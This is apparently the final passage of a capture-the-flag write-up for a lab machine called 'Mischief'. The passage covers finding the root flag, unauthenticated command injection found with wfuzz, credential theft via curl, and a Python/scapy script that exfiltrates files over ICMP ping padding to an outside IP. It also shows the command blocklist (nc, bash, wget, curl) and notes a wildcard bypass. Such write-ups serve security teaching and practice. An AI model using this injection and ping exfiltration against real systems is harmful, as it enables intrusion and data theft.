   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jul 11 20:37:53 2018 from 10.10.15.26
root@Mischief:~# id
uid=0(root) gid=0(root) groups=0(root)

```

## Find root.txt

The root.txt file in the typically location is a bit of a troll:

```

root@Mischief:~# cat root.txt
The flag is not here, get a shell to find it!

```

I can find the actual flag with a find command:

```

root@Mischief:~# find / -name root.txt
/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
/root/root.txt

root@Mischief:~# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
ae155fad...

```

And, it turns out the not is not even correct. From my `lxc` box, before I had a root shell on the actual host, I was still able to find and read the real root.txt:

```

/mnt/root # find . -name root.txt
./usr/lib/gcc/x86_64-linux-gnu/7/root.txt
./root/root.txt

/mnt/root # cat ./usr/lib/gcc/x86_64-linux-gnu/7/root.txt
ae155fad...

```

## Beyond Root

### Getting RCE Without Creds

When looking at the site source, I noticed something odd. Below is a version of the source where I cut out most of the code and replaced it with comments, but left the `if` statements to illustrate the general flow.

```

<?php
session_start();
require 'database.php';
if( isset($_SESSION['user_id']) ){
    // stuff that sets $user to null or name
?>
// HTML stuff for site header
        <?php if( !empty($user) ): ?>
            // Logged in page
        <?php else: ?>
            //Link to login
        <?php endif; ?>
</body>
</html>
<?php
if(isset($_POST['command'])) {
    // string filters and execution

```

The site uses the database to set the `$user` variable, and then if it’s set, gives the page, and if not, gives a link to login. Then it closes the body and html tags, and then it does the execution bit if the POST argument `command` is set. But it does the command execution part without checking for a valid user.

It is possible that someone could find this site and, without logging in, fuzz the parameter, and get this execution with out creds. The only leap the attacker would have to make would be that there might be some post parameters that change the output. Then they could fuzz to look for it. And it turns out that’s a very fast check with `wfuzz`:

```

root@kali# time wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d "FUZZ=junk" --hh 403 'http://[dead:beef::250:56ff:feb2:7cff]:80/'
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://[dead:beef::250:56ff:feb2:7cff]:80/
Total requests: 2588

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000207:  C=200     20 L       35 W          436 Ch        "command"

Total time: 5.800663
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 446.1558

real    0m6.084s
user    0m3.968s
sys     0m2.081s

```

Having found the parameter name, I can check out what actually returns:

```

root@kali# curl -6 -d "command=junk" -X POST 'http://[dead:beef::250:56ff:feb2:7cff]:80/'

<!DOCTYPE html>
<html>
<title>Command Execution Panel (Beta)</title>
<head>
        <link rel="stylesheet" type="text/css" href="assets/css/style.css">
        <link href="http://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css">
</head>
<body>

        <div class="header">
                <a href="/">Command Execution Panel</a>
        </div>

                <h1>Please Login
                <a href="login.php">Login</a>

</body>
</html>
Command was executed successfully!

```

From there, the same command injection would apply:

```

root@kali# curl -s -6 -d "command=cat /home/loki/cred*;" -X POST 'http://[dead:beef::250:56ff:feb2:7cff]:80/' | tail -2 | head -1
pass: lokiisthebestnorsegod

```

### Exfil via ping

#### Background

Before I realized that I could just use a `;` to get output on the page, I was experimenting with getting information via `ping`. I have since heard that the author intended to have iptables blocking IPv6 traffic outbound, which means ICMP would have been the only way to get a shell as www-data, which would have been awesome.

I’ll show up through exfiling files here, though going to full shell shouldn’t be much more difficult.

#### Manually

I knew that I could ping myself using the command, as I had tested that earlier.

On the man page for `ping`, there’s this option:

> -p pattern
> ​ You may specify up to 16padbytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.

So the option takes hex input. I can make that with `xxd`. If I use the `-p` flag in `xxd`, it just prints raw hex:

```

root@kali# echo test | xxd
00000000: 7465 7374 0a                             test.
root@kali# echo test | xxd -p
746573740a

```

In my first pass, I’ll also take advantage of a couple other flags:
- `-l 16` - only print the first 16 bytes
- `-s 0` - seek 0 (or 16, 32, etc) bytes before sending

There’s also one other bit - when I get to the end of the file, and there are less than 16 bytes left, the spacing in the ping gets off. So I’ll add “0xdf” characters to the end of the output so I can see it.

The command I’ll run is:

`ping -c 1 -p $(echo "0xdf0xdf0xdf0xdf" | cat /home/loki/cred* - | xxd -p -l 16 -s 0) 10.10.14.15`

I get:

```

root@kali# tcpdump -i2 -nnXSs 0 icmp                    
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode                
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes   
09:58:02.737594 IP 10.10.14.15 > 10.10.10.92: ICMP echo reply, id 3786, seq 1, length 64
        0x0000:  4500 0054 9c17 0000 4001 b213 0a0a 0e0f  E..T....@.......
        0x0010:  0a0a 0a5c 0000 03df 0eca 0001 4521 2e5c  ...\........E!.\
        0x0020:  0000 0000 735b 0a00 0000 0000 7061 7373  ....s[......pass   <-- output starts here
        0x0030:  3a20 6c6f 6b69 6973 7468 6562 7061 7373  :.lokiisthebpass   <-- repeats after 16 bytes
        0x0040:  3a20 6c6f 6b69 6973 7468 6562 7061 7373  :.lokiisthebpass
        0x0050:  3a20 6c6f                                :.lo

```

The first 16 bytes of the file are back: `pass: lokiistheb`

Now, update to `-s 16` for new offset, and run again:

```

10:00:24.268269 IP 10.10.14.15 > 10.10.10.92: ICMP echo reply, id 3804, seq 1, length 64
        0x0000:  4500 0054 dcd5 0000 4001 7155 0a0a 0e0f  E..T....@.qU....
        0x0010:  0a0a 0a5c 0000 67a0 0edc 0001 d321 2e5c  ...\..g......!.\
        0x0020:  0000 0000 8e26 0300 0000 0000 6573 746e  .....&......estn
        0x0030:  6f72 7365 676f 640a 3078 6466 6573 746e  orsegod.0xdfestn
        0x0040:  6f72 7365 676f 640a 3078 6466 6573 746e  orsegod.0xdfestn
        0x0050:  6f72 7365                                orse

```

I see the rest of the file, and my “0xdf”, indicating the end of the file, with contents:

`pass: lokiisthebestnorsegod`

#### Scripted

Then I wanted to take this up a level, so I wrote a python script to handle this for me. This is certainly beyond necessary, but could come in handy down the road.

I’ll use the same concepts as above, with a few tweaks:
- Instead of sending a request per 16 bytes, I’ll have the command on the target loop over the results and send the appropriate number of pings. I’ll remove newlines from the xxd output, and then use `fold -w32` to add a newline every 32 characters (16 bytes). Then I’ll have bash read line by line and send pings.
- I’ll use the `sniff` function from `scapy`, with a filter to only capture ICMP Echo Requests. I’ll write a processing function that will get the data out of each packet, add it to a buffer, and check for my marker to see if I’ve reached the end of the file. If so, I’ll print and clear the buffer. I’ll also check for packets which contain only marker, and ignore those.
- I’ll run the sniffing in a thread, so that it can happen in the background while I interact with the loop.
- I’ll have an infinite loop run taking file name, and then using requests to send the POST to make the pings come back.

```

  1 #!/usr/bin/env python3
  2 
  3 import requests
  4 import sys
  5 from scapy.all import *
  6 from threading import Thread
  7 
  8 buf = ''
  9 marker = "0xdf"
 10 
 11 def parse_ping(pkt):
 12     global buf
 13     setmarker = set(marker)  # to check if string is completely marker in some order
 14     buf += pkt[ICMP].load[16:32].decode('utf-8')
 15     if set(buf[-4:]) == setmarker:
 16         if set(buf) != setmarker:
 17             buf = buf[:buf.index(marker)]
 18             print(f"{buf}")
 19         buf = ''
 20 
 21 def sniffer():
 22     sniff(iface="tun0", filter="icmp[icmptype] == 8", prn=parse_ping)
 23 
 24 sniff_thread = Thread(target = sniffer)
 25 sniff_thread.daemon = True  # allow ctrl-c to exit
 26 sniff_thread.start()
 27 
 28 if len(sys.argv) < 2:
 29     ip = input("ip: ")
 30 else:
 31     ip = sys.argv[1]
 32 
 33 data = """(echo "{marker}" | cat {cmd} -) | xxd -p | tr -d '\\n' | fold -w 32 | while read data; do ping -c 1 -p $data 10.10.14.15; done;"""
 34 
 35 while True:
 36     try:
 37         cmd = input("filename: ")
 38         print()
 39         resp = requests.post(f'http://{ip}/',
 40                    data=f"command={data.format(cmd=cmd,marker=marker*4)}",
 41                    headers={"Content-Type": "application/x-www-form-urlencoded"})
 42         if "Command is not allowed." in resp.text:
 43             print("Name filtered. Try again")
 44     except requests.exceptions.ConnectionError:
 45         print(f"Unable to connect to {ip}.")
 46         sys.exit()
 47     except KeyboardInterrupt:
 48         print()
 49         sys.exit()

```

Here’s the script in action. I’ve got a `tcpdump` windows on the bottom as well to show the pings as they come in.

![](https://0xdfimages.gitlab.io/img/mischief-ping-exfil.gif)

### Web Application Filtering

When I was trying to get command injection into the command app, I noticed that a several commands returned that they were not allowed. Based on my testing, it appeared that my input was being filtered based on string values. Here’s the same output again to show what my testing revealed:

![1546523176280](https://0xdfimages.gitlab.io/img/1546523176280.png)

Looking at the page source, after the `</html>`, there’s a php block that reads the POST command argument, and simply does a bunch of `strpos($cmd, "string") !== false` checks in a big `if elseif else`. The else is to run the command:

```

<?php
if(isset($_POST['command'])) {
        $cmd = $_POST['command'];
        if (strpos($cmd, "nc" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "bash" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "chown" ) !== false){
                echo "Command is not allowed.";
...[snip]...
        } elseif (strpos($cmd, "telnet" ) !== false){
                echo "Command is not allowed.";
        } else {
                system("$cmd > /dev/null 2>&1");
                echo "Command was executed successfully!";
        }
}
?>

```

I can get the list of blocked strings using a simple `grep`/`cut`:

```

loki@Mischief:/var/www/html$ cat index.php | grep strpos | cut -d'"' -f2
nc
bash
chown
setfacl
chmod
perl
find
locate
ls
php
wget
curl
dir
ftp
telnet

```

That matches up nicely with what I figured out from outside. Wildcards are the best bypass for this filter.

### iptables

I had trouble getting a reverse shell using IPv4. When I got on as root, I could use `iptables -L` to show why: Only snmp, ssh, and tcp 3366 were allowed in and out. Everything else is dropped.

```

root@Mischief:/# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:domain /* generated for LXD network lxdbr0 */
ACCEPT     udp  --  anywhere             anywhere             udp dpt:domain /* generated for LXD network lxdbr0 */
ACCEPT     udp  --  anywhere             anywhere             udp dpt:bootps /* generated for LXD network lxdbr0 */
ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
DROP       udp  --  anywhere             anywhere
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:3366
DROP       tcp  --  anywhere             anywhere

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere             /* generated for LXD network lxdbr0 */
ACCEPT     all  --  anywhere             anywhere             /* generated for LXD network lxdbr0 */

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:domain /* generated for LXD network lxdbr0 */
ACCEPT     udp  --  anywhere             anywhere             udp spt:domain /* generated for LXD network lxdbr0 */
ACCEPT     udp  --  anywhere             anywhere             udp spt:bootps /* generated for LXD network lxdbr0 */
ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
DROP       udp  --  anywhere             anywhere
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:3366
DROP       tcp  --  anywhere             anywhere

```

On the other hand, `iptables6 -L` shows basically everything open, which is why I was able to get a shell back that way:

```

root@Mischief:/# ip6tables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     tcp      anywhere             anywhere             tcp dpt:domain /* generated for LXD network lxdbr0 */
ACCEPT     udp      anywhere             anywhere             udp dpt:domain /* generated for LXD network lxdbr0 */
ACCEPT     udp      anywhere             anywhere             udp dpt:dhcpv6-client /* generated for LXD network lxdbr0 */

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all      anywhere             anywhere             /* generated for LXD network lxdbr0 */
ACCEPT     all      anywhere             anywhere             /* generated for LXD network lxdbr0 */

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     tcp      anywhere             anywhere             tcp spt:domain /* generated for LXD network lxdbr0 */
ACCEPT     udp      anywhere             anywhere             udp spt:domain /* generated for LXD network lxdbr0 */
ACCEPT     udp      anywhere             anywhere             udp spt:dhcpv6-client /* generated for LXD network lxdbr0 */

```

Had the author put the blocks in place on IPv6, this would have been more challenging for sure.